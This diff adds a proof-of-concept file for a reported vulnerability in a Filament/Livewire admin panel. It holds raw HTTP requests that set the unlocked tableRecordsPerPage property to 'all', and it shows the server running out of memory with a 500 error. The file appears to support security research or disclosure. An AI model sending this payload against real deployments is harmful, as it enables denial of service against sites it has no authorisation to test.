@@ -1,0 +1,28 @@
+### VULN-006 — decisive request. Full capture in response.txt / run.log.
+### tableRecordsPerPage is a public (non-#[Locked]) Livewire property; the live
+### getter returns it verbatim (no clamp), and 'all' becomes the full row count
+### as the SQL LIMIT → the worker hydrates/renders the entire table and OOMs.
+
+### 1) Obtain a valid snapshot (authenticated panel user)
+GET /admin/posts HTTP/1.1
+Host: localhost:21890
+Cookie: filament-session=<session>
+
+### 2) Re-render the table with perPage='all' on a large table → HTTP 500 (OOM)
+POST /livewire/update HTTP/1.1
+Host: localhost:21890
+Content-Type: application/json
+X-Livewire: true
+X-CSRF-TOKEN: <csrf>
+
+{
+  "_token": "<csrf>",
+  "components": [
+    { "snapshot": "<list-posts snapshot>",
+      "updates": { "tableRecordsPerPage": "all" },
+      "calls": [] }
+  ]
+}
+
+### Response: HTTP 500; app log shows
+###   production.ERROR: Allowed memory size of 536870912 bytes exhausted
